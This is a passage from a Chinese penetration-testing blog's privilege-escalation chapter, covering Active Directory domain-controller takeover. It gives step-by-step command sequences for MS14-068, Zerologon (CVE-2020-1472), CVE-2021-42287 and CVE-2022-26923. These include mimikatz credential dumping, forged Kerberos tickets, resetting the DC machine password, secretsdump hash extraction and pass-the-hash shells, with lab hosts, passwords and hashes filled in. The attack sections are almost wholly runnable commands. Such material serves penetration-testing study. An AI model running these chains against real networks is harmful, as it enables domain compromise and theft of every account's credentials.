<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ms14-068.exe:</span></span><br><span class="line">https://github.com/abatchy17/WindowsExploits/tree/master/MS14- 068</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PSexec:</span></span><br><span class="line">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mimikatz:</span></span><br><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞利用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 如果当前用户为域用户</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到域成员用户名和 sid 号</span></span><br><span class="line">whoami /user </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定要同步时钟的域，可以查看域名称</span></span><br><span class="line">net time /domain </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 如果当前用户是普通用户，利用管理员身份启动 mimikatz 利用下列命令获取域用户 sid 和域控主机名</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">权限提升</span> </span><br><span class="line">privilege::debug </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">抓取密码</span></span><br><span class="line">sekurlsa::logonPasswords </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 利用 ms14-068.exe 工具生成伪造的 kerberos 协议认证证书</span></span><br><span class="line">ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器 地址</span><br><span class="line">ms14-068.exe -u mary@god.org -p admin!@#45 -s S-1-5-21-1218902331- 2157346161-1782232778-1124 -d OWA2010CN-God.god.org</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d. 利用 mimikatz.exe 将证书写入，从而提升为域管理员</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除当前会话</span></span><br><span class="line">kerberos::purge </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入由 ms14-068.exe 生成的证书 名字</span></span><br><span class="line">kerberos::ptc &quot;TGT_test02@test.lab.ccache&quot; </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看与域控是否建立了联系</span></span><br><span class="line">kerberos::list </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">e. 连接域控，获取域控的 shell</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试连接是否成功</span></span><br><span class="line">dir \\OWA2010CN-God.god.org\C$ </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 PsExec.exe 以管理员权限运行连接域控</span></span><br><span class="line">psexec \\OWA2010CN-God.god.org cmd </span><br></pre></td></tr></table></figure>
<h4 id="cve-2020-1472"><a class="markdownIt-Anchor" href="#cve-2020-1472">#</a> CVE-2020-1472</h4>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODM3NDgz">https://cloud.tencent.com/developer/article/1837483</span></p>
<ul>
<li>前提条件</li>
</ul>
<p>CVE-2020-1472 是继 MS17010 之后好用的 NetLogon 特权域控提权漏洞， 只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞。该漏洞不要求当前计算机在域内，也不要求当前计算机操作系统为 Windows.</p>
<ul>
<li>工具下载</li>
</ul>
<p>下载 poc:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyYUJWL0NWRS0yMDIwLTE0NzI=">https://github.com/SecuraBV/CVE-2020-1472</span><br>
 下载 exp:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=">https://github.com/dirkjanm/CVE-2020-1472</span></p>
<ul>
<li>漏洞利用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 获取目标计算机名，进行漏洞检测</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取目标计算机名</span></span><br><span class="line">nbtscan -v -h 192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证漏洞是否存在</span></span><br><span class="line">python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 重置DC密码，获取<span class="built_in">hash</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重置 DC 密码：</span></span><br><span class="line">python3 cve- 2020 - 1472 - exploit.py OWA2010CN-GOD 192.168.3.21</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用impacket包中的secretsdum.py来获取相关的HASH:</span></span><br><span class="line">python3 secretsdump.py god.org/OWA2010CN-GOD\$@192.168.3.21 -no-pass</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 通过wmicexec.py使用<span class="built_in">hash</span>获取DC的shell</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取HASH后，可以利用wmiexec.py登录，从而获取一个shell</span></span><br><span class="line">python wmiexec.py -hashes &lt;HASH&gt; DOMAIN/DOMAIN_USER@DC_ipaddr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">wmi连接反弹</span></span><br><span class="line">python3 wmiexec.py god/administrator@192.168.3.21 -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>
<h4 id="cve-2021-42287"><a class="markdownIt-Anchor" href="#cve-2021-42287">#</a> CVE-2021-42287</h4>
<p>参考地址：<span class="exturl" data-url="aHR0cHM6Ly9uZXcucXEuY29tL3JhaW4vYS8yMDIxMTIxN2EwYnJtZjAw">https://new.qq.com/rain/a/20211217a0brmf00</span></p>
<ul>
<li>前提条件</li>
</ul>
<p>一个普通域成员帐户 + 域用户有创建机器用户的权限（一般默认权限）+ DC 未打补丁 KB5008380 或 KB5008602。</p>
<ul>
<li>工具下载</li>
</ul>
<p>sam_the_admin.py: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dhemVIZWxsL3NhbS10aGUtYWRtaW4=">https://github.com/WazeHell/sam-the-admin</span></p>
<ul>
<li>漏洞利用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有<span class="built_in">hash</span></span></span><br><span class="line">python3 sam_the_admin.py god/&#x27;mary:admin!@#45&#x27; -dc-ip 192.168.3.21 -shell</span><br></pre></td></tr></table></figure>
<h4 id="cve-2022-26923"><a class="markdownIt-Anchor" href="#cve-2022-26923">#</a> CVE-2022-26923</h4>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zMzU0NzEuaHRtbA==">https://www.freebuf.com/vuls/335471.html</span></p>
<ul>
<li>前提条件</li>
</ul>
<p>一个域内普通账号 + 域内存在证书服务器</p>
<ul>
<li>工具下载</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x5NGsvQ2VydGlweQ==">https://github.com/ly4k/Certipy</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NyYXZhdGVSb3VnZS9ibG9vZHlBRA==">https://github.com/CravateRouge/bloodyAD</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0">https://github.com/SecureAuthCorp/impacket</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL1BLSU5JVHRvb2xz">https://github.com/dirkjanm/PKINITtools</span></p>
<ul>
<li>漏洞利用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">a. 首先需要获取域控服务器，域证书服务器的一些基本信息</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在受控的主机上执行powershell命令</span></span><br><span class="line">Get-ChildItem Cert:\LocalMachine\Root\</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到域证书服务器地址fenghuotai-DC-CA，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域控服务器地址fenghuotai.local，域控计算机名为dc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">b. 设置攻击机的DNS服务器地址为域控DNS服务器地址</span></span><br><span class="line">192.168.1.15 fenghuotai.local dc.fenghuotai.local fenghuotai-DC-CA</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c. 使用掌握的域内普通用户账号申请证书并验证登录，测试复现环境是否异常</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">申请证书 可能会遇到NETBIOS超时现象，重新执行一次申请证书命令即可</span></span><br><span class="line">certipy req &#x27;fenghuotai.local/testcve:1qaz3edc.@dc.fenghuotai.local&#x27; -ca fenghuotai-DC-CA -template User</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证该证书，获取其NT <span class="built_in">hash</span></span></span><br><span class="line">certipy auth -pfx testcve.pfx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">d. 新建账号pwnmachine，配置DNShostname，并申请域控dc$的证书</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建一台名为pwnmachine，密码为CVEPassword1234*的机器账号：</span></span><br><span class="line">python bloodyAD.py -d fenghuotai.local -u testcve -p &#x27;1qaz3edc.&#x27; --host 192.168.220.160 addComputer pwnmachine &#x27;CVEPassword1234*&#x27;，</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置其dNSHostName 属性为域控服务器属性：</span></span><br><span class="line">python bloodyAD.py -d fenghuotai.local -u testcve -p &#x27;1qaz3edc.&#x27; --host 192.168.220.160 setAttribute &#x27;CN=pwnmachine,CN=Computers,DC=fenghuotai, DC=local&#x27; dNSHostName &#x27;[&quot;dc.fenghuotai.local&quot;]&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">申请新建的机器账号pwnmachine$的证书，其实申请到的是域控dc$的证书：</span></span><br><span class="line">certipy req &#x27;fenghuotai.local/pwnmachine$:CVEPassword1234*@192.168.220.160&#x27; -template Machine -dc-ip 192.168.220.160 -ca fenghuotai-DC-CA</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行登录验证，获取其NT <span class="built_in">hash</span>:</span></span><br><span class="line">certipy auth -pfx ./dc.pfx -dc-ip 192.168.220.160</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">e. 获取域内所有账户<span class="built_in">hash</span>，通过<span class="built_in">hash</span>获取shell</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用impacket工具examples目录下的secretsdump.py脚本：</span></span><br><span class="line">python3 secretsdump.py &#x27;fenghuotai.local/dc$@dc.fenghuotai.local&#x27; -hashes :xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过<span class="built_in">hash</span>获取到域控的shell</span></span><br><span class="line">python3 wmiexec.py fenghuotai.local/administrator@192.168.1.15 -hashes aad3b435b51404eeaad3b435b51404ee:e6f01fc9f2a0dc96871220f7787164bd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">还可以使用PKINITtools工具，获取域控最高权限shell</span></span><br></pre></td></tr></table></figure>
      <div class="tags">
          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
  </span>
  <span id="2022/12/30/SAFE/9 权限提升/" class="item leancloud_visitors" data-flag-title="XD22 9 权限提升" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://www.n1h1l157.live/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="XD22 9 权限提升">http://www.n1h1l157.live/2022/12/30/SAFE/9 权限提升/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;z4cW6UBjvtpaC8R.jpg" title="XD22 3 服务攻防">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 3 服务攻防</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;YR8Qc1kd6WE3lSq.jpg" title="XD22 13 补充知识">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 13 补充知识</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text"> webshell 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin-%E7%AA%81%E7%A0%B4"><span class="toc-number">1.1.</span> <span class="toc-text"> phpmyadmin 突破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win-web-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text"> win web 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf-%E5%85%A8%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> MSF 全自动提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text"> cs 半自动化提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text"> 数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> mysql 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mssql-%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text"> mssql 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#oracle-%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text"> oracle 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#postgresql-%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text"> postgresql 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.</span> <span class="toc-text"> 三方应用提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text"> win 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#at-sc-%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text"> at sc 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec-%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text"> psexec 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text"> 进程迁移注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E4%BB%A4%E7%89%8C"><span class="toc-number">3.4.</span> <span class="toc-text"> 窃取令牌</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.</span> <span class="toc-text"> 烂土豆提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win-msf-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83"><span class="toc-number">3.6.</span> <span class="toc-text"> Win msf 自动化提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypassuac-%E6%8F%90%E6%9D%83"><span class="toc-number">3.7.</span> <span class="toc-text"> bypassUAC 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">3.8.</span> <span class="toc-text"> Dll 劫持提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E5%8F%8A%E6%9D%83%E9%99%90"><span class="toc-number">3.9.</span> <span class="toc-text"> 服务路径及权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text"> linux 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E9%A1%B9%E7%9B%AE%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.</span> <span class="toc-text"> 辅助项目提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text"> suid 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.</span> <span class="toc-text"> 脏牛提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%8F%E7%AE%A1%E9%81%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text"> 脏管道提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E5%90%88suid"><span class="toc-number">4.5.</span> <span class="toc-text"> 环境变量配合 suid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E9%85%8D%E5%90%88tar"><span class="toc-number">4.6.</span> <span class="toc-text"> 定时任务配合 tar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">4.7.</span> <span class="toc-text"> 权限配置不当</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-mysql%E6%8F%90%E6%9D%83"><span class="toc-number">4.8.</span> <span class="toc-text"> linux mysql 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mdut-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.9.</span> <span class="toc-text"> mdut 数据库提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rsync-%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">4.10.</span> <span class="toc-text"> rsync 未授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker-%E7%BB%84%E6%8C%82%E8%BD%BD"><span class="toc-number">4.11.</span> <span class="toc-text"> docker 组挂载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo-%E6%8F%90%E6%9D%83"><span class="toc-number">4.12.</span> <span class="toc-text"> sudo 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polkit-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.13.</span> <span class="toc-text"> polkit 漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text"> 域控提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2014-6324"><span class="toc-number">5.1.</span> <span class="toc-text"> CVE-2014-6324</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2020-1472"><span class="toc-number">5.2.</span> <span class="toc-text"> CVE-2020-1472</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2021-42287"><span class="toc-number">5.3.</span> <span class="toc-text"> CVE-2021-42287</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cve-2022-26923"><span class="toc-number">5.4.</span> <span class="toc-text"> CVE-2022-26923</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li><a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li class="active"><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li><li><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2023/05/01/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/10/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/23/SAFE/%E8%BD%AC%E5%82%A8%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/" rel="bookmark" title="转储微信聊天记录">转储微信聊天记录</a></li><li><a href="/2023/07/31/SAFE/%E6%A0%91%E8%8E%93%E6%B4%BE%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" 